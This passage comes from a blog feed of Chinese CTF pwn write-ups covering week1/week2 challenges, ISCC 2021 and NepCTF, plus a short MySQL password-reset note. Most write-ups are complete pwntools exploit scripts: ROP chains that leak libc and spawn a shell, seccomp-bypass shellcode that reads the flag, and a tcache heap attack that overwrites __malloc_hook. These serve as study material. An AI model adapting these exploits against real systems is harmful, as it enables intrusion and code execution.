class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">0xe7</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">getshell = <span class="string">&#x27;a&#x27;</span> *<span class="number">0x28</span></span><br><span class="line">getshell += p64(libc_base + <span class="number">0x4f3d5</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;It is your turn: &#x27;</span>)</span><br><span class="line">p.sendline(getshell)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="letter（没搞懂"><a href="#letter（没搞懂" class="headerlink" title="letter（没搞懂"></a>letter（没搞懂</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307191837.png" alt="20210307191837"></p>
<p>程序禁用了一些系统调用，导致无法直接用 shellcode 直接getshell ，即 asm(shellcraft.sh())，所以得手写汇编 shellcode；因为程序是64位的，所以要写 context.arch = ‘amd64’</p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307194929.png" alt="20210307194929"></p>
<p>负数溢出，但是没搞明白的是为什么是 -268376833 。。。。当事人非常郁闷</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./letter&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line"><span class="comment">#r.sendline(&#x27;a&#x27;*0x18+p64(0x60105c)+asm(shellcraft.sh()))</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x67616c66</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx, 0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x601070</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>发现其他师傅有另外的解法</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pr</span>(<span class="params">a,addr</span>):</span></span><br><span class="line">	log.success(a+<span class="string">&#x27;====&gt;&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">prdi = <span class="number">0x400AA3</span></span><br><span class="line">p6 = <span class="number">0x400A9A</span></span><br><span class="line">mmmc = <span class="number">0x400A80</span></span><br><span class="line">vuln = <span class="number">0x400958</span></span><br><span class="line">p = remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">31305</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./letter&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4009BB&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xffffffff</span>).ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(p6)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(mmmc)+<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x4009DD</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;.\n&#x27;</span>)</span><br><span class="line">write_leak = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libcbase = write_leak - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pr(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)+asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>,<span class="number">0x00601000</span>+<span class="number">0x500</span>+<span class="number">0x100</span>,<span class="number">100</span>))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<p>搞不懂控制 rbp 为 0x00601000+0x500+0x10 是为什么。。。。</p>
<h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="rop-primary"><a href="#rop-primary" class="headerlink" title="rop_primary"></a>rop_primary</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195557.png" alt="20210309195557"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195620.png" alt="20210309195620"></p>
<p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210309195630.png" alt="20210309195630"></p>
<p>分析下来就是程序会给两个矩阵，我们要一个个输入两个矩阵相乘的结果来通过 check 函数，从而利用 vuln 去 rop</p>
<p>首先考的就是 python 功底，当然我是不太过关的。。。。</p>
<p>exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_matrix</span>():</span></span><br><span class="line">	matrix = []</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		line = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip()    </span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">			row.append(<span class="built_in">int</span>(num))</span><br><span class="line">		<span class="built_in">print</span>(line)</span><br><span class="line">        matrix.append(row)</span><br><span class="line">	<span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_matrix</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	rows = <span class="built_in">len</span>(a)</span><br><span class="line">	mid = <span class="built_in">len</span>(b)</span><br><span class="line">	cols = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">	result = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">			num = <span class="number">0</span></span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid):</span><br><span class="line">				num += a[i][k] * b[k][j]</span><br><span class="line">			row.append(num)</span><br><span class="line">		result.append(row)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line">a = read_matrix()</span><br><span class="line">b = read_matrix()</span><br><span class="line"></span><br><span class="line">result = multi_matrix(a, b)</span><br></pre></td></tr></table></figure>

<p>之后就是简单的 rop 了</p>
<p>exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;zsh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;159.75.104.107&#x27;</span>,<span class="number">30372</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./rop_primary&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_matrix</span>():</span></span><br><span class="line">	matrix = []</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		line = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip()    </span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">			row.append(<span class="built_in">int</span>(num))</span><br><span class="line">		<span class="built_in">print</span>(line)</span><br><span class="line">        matrix.append(row)</span><br><span class="line">	<span class="keyword">return</span> matrix</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi_matrix</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	rows = <span class="built_in">len</span>(a)</span><br><span class="line">	mid = <span class="built_in">len</span>(b)</span><br><span class="line">	cols = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">	result = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">		row = []</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">			num = <span class="number">0</span></span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid):</span><br><span class="line">				num += a[i][k] * b[k][j]</span><br><span class="line">			row.append(num)</span><br><span class="line">		result.append(row)</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line">a = read_matrix()</span><br><span class="line">b = read_matrix()</span><br><span class="line"></span><br><span class="line">result = multi_matrix(a, b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> result:</span><br><span class="line">	<span class="keyword">for</span> num <span class="keyword">in</span> row:</span><br><span class="line">		p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop_primary&#x27;</span>)</span><br><span class="line">pus_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pus_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401613</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000401611</span></span><br><span class="line">vuln_addr = <span class="number">0x000000000040157B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(pop_rdi) + p64(pus_got) + p64(pus_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;try your best\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">offset = puts_addr -  	<span class="number">0x0875a0</span>    </span><br><span class="line">system_addr = offset + <span class="number">0x055410</span>   </span><br><span class="line">bin_sh = offset + 	<span class="number">0x1b75aa</span>        </span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(ret_addr) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



























]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>ISCC_2021</title>
    <url>/article/ISCC_2021/</url>
    <content><![CDATA[<h1 id="ISCC-2021"><a href="#ISCC-2021" class="headerlink" title="ISCC_2021"></a>ISCC_2021</h1><span id="more"></span>

<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>保护</p>
<p><img src="/article/ISCC_2021/image-20210526132438302.png" alt="image-20210526132438302"></p>
<p>ida</p>
<p>给了 system(“/bin/sh”)</p>
<p><img src="/article/ISCC_2021/image-20210526132504575.png" alt="image-20210526132504575"></p>
<p>漏洞在对 password 的检查 check 函数中</p>
<p><img src="/article/ISCC_2021/image-20210526132549268.png" alt="image-20210526132549268"></p>
<p>password 长度限制长度为7，然后 strcpy 到 dest，通过 s 溢出给 dest，达到栈溢出。</p>
<p>但长度被限制了，无法直接栈溢出。</p>
<p>想到程序是32bit，strlen函数指取寄存器的低位，而 strcpy函数是直到 ‘\x00’ 才停止。</p>
<p>我们发送的payload是0x107位就能使得strlen==7。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./M78&#x27;</span>)</span><br><span class="line"></span><br><span class="line">call_main = <span class="number">0x08049202</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please choose a building&#x27;</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the password&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>保护</p>
<p><img src="/article/ISCC_2021/image-20210526180142223.png" alt="image-20210526180142223"></p>
<p>ida</p>
<p><img src="/article/ISCC_2021/image-20210526180156262.png" alt="image-20210526180156262"></p>
<p><img src="/article/ISCC_2021/image-20210526180206793.png" alt="image-20210526180206793"></p>
<p>c语言写程序跑一遍</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    srand(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">10</span>;i++)&#123;</span><br><span class="line">        a = rand();</span><br><span class="line">        srand(a);</span><br><span class="line">        b = rand()%<span class="number">100</span>+<span class="number">1</span>;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>,b); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/ISCC_2021/image-20210526182640652.png" alt="image-20210526182640652"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./game&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">68</span>,<span class="number">67</span>,<span class="number">15</span>,<span class="number">86</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p32(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your name is :&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Guess Number:&#x27;</span>,<span class="built_in">str</span>(s[i]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="box"><a href="#box" class="headerlink" title="box"></a>box</h2><p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, sys, base64</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.96.88.40&#x27;</span>,<span class="number">7020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,length,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input data:&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Please input the data:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>比赛WriteUp</category>
      </categories>
  </entry>
  <entry>
    <title>mysql</title>
    <url>/article/mysql/</url>
    <content><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><span id="more"></span>

<h2 id="ssh连接服务器"><a href="#ssh连接服务器" class="headerlink" title="ssh连接服务器"></a>ssh连接服务器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh username@ipaddress</span><br></pre></td></tr></table></figure>



<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>



<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>想修改密码，网上找到的指令，结果报错了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update user set password&#x3D;password(&#39;新密码&#39;) where user&#x3D;&#39;用户名&#39;;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure>

<p>错误的原因是 5.7版本下的mysql数据库下已经没有password这个字段了，password字段改成了authentication_string</p>
<p>正确姿势：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;****&#39;) where user&#x3D;&#39;****&#39;;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 1</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">update user set authentication_string&#x3D;password(&quot;*&quot;) where user&#x3D;&quot;root&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WriteUp/笔记</category>
      </categories>
  </entry>
  <entry>
    <title>NepCTF</title>
    <url>/article/NepCTF/</url>
    <content><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><span id="more"></span>
<h2 id="xhh"><a href="#xhh" class="headerlink" title="xhh"></a>xhh</h2><p><img src="https://raw.githubusercontent.com/YTrick/image/branch/image/20210322132920.png" alt="20210322132920"></p>
<p>栈溢出，填充0x10，然后找到system cat flag函数，据地址随机化后字节不变，小端更改地址，当图片刷到小蝌蚪的图案便getshell</p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;xhh&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node2.hackingfor.fun&#39;,35402 )</span><br><span class="line">#p &#x3D; remote(&#39;127.0.0.1&#39;,12345)</span><br><span class="line"></span><br><span class="line">payload &#x3D; p64(0) + p64(1) + b&quot;\xE1&quot;</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>











